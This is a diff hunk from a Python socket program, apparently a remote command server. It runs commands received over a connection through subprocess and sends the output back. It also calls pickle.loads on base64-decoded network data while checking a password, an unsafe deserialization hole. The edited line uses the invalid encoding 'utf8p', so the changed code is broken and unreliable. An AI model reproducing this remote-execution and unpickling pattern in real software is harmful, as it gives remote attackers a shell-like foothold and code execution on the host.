@@ -44,13 +44,10 @@ def main():
             command = raw_command.split(' ')
             print('executing: ' + raw_command)
             try:
-                output = subprocess.check_output(command, stderr=subprocess.STDOUT)
-            except (subprocess.CalledProcessError, OSError) as e:
-                if type(e) == OSError:
-                    output = e
-                else:
-                    output = e.output
-            conn.send(bytes(('b3V0cHV0Cg==' + str(output)).encode('utf8')))
+                output = str(subprocess.check_output(command, stderr=subprocess.STDOUT))
+            except (subprocess.CalledProcessError, FileNotFoundError) as e:
+                output = str(e)
+            conn.send(bytes(('b3V0cHV0Cg==' + output).encode('utf8p')))
             return True
         if rot.decodes(pickle.loads(base64.b64decode(data))) == password:
             conn.send(bytes('correct'.encode('utf8')))
